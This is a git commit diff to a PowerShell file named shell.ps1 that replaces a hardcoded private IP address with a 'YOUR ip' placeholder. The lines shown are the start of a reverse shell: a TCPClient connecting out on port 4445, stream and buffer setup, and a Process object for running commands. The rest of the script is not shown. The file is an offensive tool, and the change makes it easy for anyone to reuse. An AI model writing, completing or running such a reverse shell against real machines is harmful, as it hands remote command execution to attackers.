d09a2fbd2855a6703cd25ac577abe1dffbd57a0a
SCARAR <cybriaprogramming@cybria.net>
2025-05-19 10:00:32 -0400

    Update shell.ps1

--- Scripts/shell.ps1
+++ Scripts/shell.ps1
@@ -1,4 +1,4 @@
-$c = New-Object System.Net.Sockets.TCPClient("172.22.238.168", 4445)
+$c = New-Object System.Net.Sockets.TCPClient("YOUR ip", 4445)
 $s = $c.GetStream()
 [byte[]]$b = 0..65535|%{0}
 $p = New-Object System.Diagnostics.Process
